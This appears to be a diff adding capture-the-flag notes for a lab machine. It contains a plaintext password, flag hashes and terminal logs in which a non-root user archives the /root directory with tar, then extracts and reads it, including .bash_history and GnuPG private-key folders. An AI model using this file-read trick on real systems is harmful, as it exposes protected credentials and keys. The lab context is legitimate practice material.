@@ -1,0 +1,67 @@
+
+
+<!-- WIP since browser keeps on hanging due to some unknown resource consumption. Need to figure it out. -->
+<!-- <script type="text/javascript" src="../../mysite/register.html"></script> -->
+
+<!-- Reverse of norris -->
+
+
+
+You're smart enough to understand me. Here's your secret, TryToGuessThisNorris@2k19
+
+
+norris@sirrom:~$ cat user.txt 
+2c2836a138c0e7f7529aa0764a6414d0
+
+
+total 368
+drwxr-xr-x 4 root     root       4096 Oct 11 10:32 .
+drwxr-xr-x 3 root     root       4096 Oct 11 01:44 ..
+-rw-r--r-- 1 www-data www-data   6301 Oct 11 02:43 backups
+-rw-r--r-- 1 www-data www-data    325 Oct 11 04:55 backups.html
+-rw-r--r-- 1 www-data www-data  78635 Oct 10 22:17 bootstrap.bundle.min.js
+-rw-r--r-- 1 www-data www-data 155758 Oct 10 22:17 bootstrap.min.css
+-rw-r--r-- 1 www-data www-data     44 Oct 11 02:27 hits.txt
+drwxr-xr-x 2 www-data www-data   4096 Oct 11 04:47 images
+-rw-r--r-- 1 www-data www-data   2186 Oct 11 02:08 index.htm
+-rw-r--r-- 1 www-data www-data   1964 Oct 11 02:03 index.html
+-rw-r--r-- 1 www-data www-data  71037 Oct 10 22:17 jquery.slim.min.js
+-rw-r--r-- 1 www-data www-data    879 Oct 11 00:04 landing.css
+drwxr-xr-x 2 www-data www-data   4096 Oct 11 04:52 mysite
+-rw-r--r-- 1 www-data www-data     99 Oct 11 10:32 secretfile
+-rw------- 1 www-data www-data  12288 Oct 11 10:32 .secretfile.swp
+norris@sirrom:/var/www/html$ cat secretfile 
+I see you're here for the password. Holy Moly! Battery is dying !! Mentioning below for reference.
+norris@sirrom:/var/www/html$ 
+
+norris@sirrom:~$ tar -cvf /home/norris/pwndroot.tgz /root
+tar: Removing leading `/' from member names
+/root/
+/root/root.txt
+/root/.bashrc
+/root/.gnupg/
+/root/.gnupg/private-keys-v1.d/
+/root/.bash_history
+/root/.cache/
+/root/.local/
+/root/.local/share/
+/root/.local/share/nano/
+/root/.profile
+norris@sirrom:~$ tar -xvf pwndroot.tgz
+root/
+root/root.txt
+root/.bashrc
+root/.gnupg/
+root/.gnupg/private-keys-v1.d/
+root/.bash_history
+root/.cache/
+root/.local/
+root/.local/share/
+root/.local/share/nano/
+root/.profile
+norris@sirrom:~$ cd root/
+norris@sirrom:~/root$ cat root.txt 
+8fc9376d961670ca10be270d52eda423
+norris@sirrom:~/root$ 
+
+
